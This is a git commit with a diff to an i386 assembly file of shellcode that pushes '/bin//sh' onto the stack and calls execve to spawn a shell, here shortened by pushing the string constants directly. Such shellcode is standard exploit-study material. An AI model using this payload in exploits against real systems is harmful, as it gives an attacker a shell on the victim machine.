0c0293f6c402b7f35106583e7cfb77822c03cd8d
BiggieBoo18 <ns182418@gmail.com>
2018-12-01 10:21:21 +0900

    add amd64

--- i386/shellcode_i386.asm
+++ i386/shellcode_i386.asm
@@ -4,10 +4,8 @@
 _start:
 	xor	edx,edx		; edx=NULL
 	push	edx		; push NULL
-	mov	eax,0x68732f2f	; eax='//sh'
-	push	eax		; push '//sh'
-	mov	eax,0x6e69622f	; eax='/bin'
-	push	eax		; push '/bin'
+	push	0x68732f2f	; eax='//sh'
+	push	0x6e69622f	; eax='/bin'
 	lea	eax,[edx+11]	; execve syscall no.
 	mov	ebx,esp		; ebx='/bin/sh\0'
 	push	edx		; push NULL
